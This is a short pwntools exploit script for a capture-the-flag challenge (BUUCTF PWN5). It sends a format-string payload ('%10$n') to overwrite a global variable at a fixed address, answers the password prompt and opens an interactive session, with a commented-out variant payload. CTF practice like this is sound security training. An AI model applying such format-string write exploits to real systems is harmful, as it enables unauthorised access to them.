from pwn import *
from LibcSearcher import *

# BUUCTF - [第五空间2019 决赛]PWN5
context(log_level = 'debug', arch = 'i386', os = 'linux')
p = remote('node5.buuoj.cn', 26022)
#p=process('./pwn')

guess_num_addr = 0x804C044

# 地址在前
payload = p32(guess_num_addr) + b'%10$n'
p.sendlineafter(b'name:', payload)
p.sendlineafter(b'passwd:', b'4')

# 地址在后
# payload = b'AAA%12$n' + p32(guess_num_addr)
# p.sendlineafter(b'name:', payload)
# p.sendlineafter(b'passwd:', b'3')


p.interactive() 
